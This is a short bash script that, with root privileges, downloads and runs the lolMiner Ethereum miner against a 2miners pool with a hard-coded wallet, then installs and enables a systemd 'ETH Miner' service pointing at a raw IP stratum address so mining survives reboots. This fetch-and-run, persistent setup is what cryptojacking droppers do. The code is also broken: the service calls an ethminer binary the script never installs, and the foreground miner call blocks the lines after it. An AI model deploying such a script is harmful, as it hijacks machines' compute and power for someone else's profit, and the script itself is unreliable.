SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
then
	echo "taind vip pro" > isHaveSetupCoin.txt
	cd /usr/local/bin
	sudo wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.33/lolMiner_v1.33_Lin64.tar.gz
	sudo tar -xf lolMiner_v1.33_Lin64.tar.gz
	sudo ./lolMiner --algo ETHASH --pool us-eth.2miners.com:2020 --user 15FsczceHVaBuV12mBNKFLEJVRZA5hCBdo.t11
	sudo bash -c 'echo -e "[Unit]\nDescription=ETH Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/bin/ethminer -U -P stratum://192.159.142.45:6868 &\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/eth.service'
	sudo systemctl daemon-reload
	sudo systemctl enable eth.service
	sudo systemctl start eth.service
else
	sudo systemctl start eth.service
fi
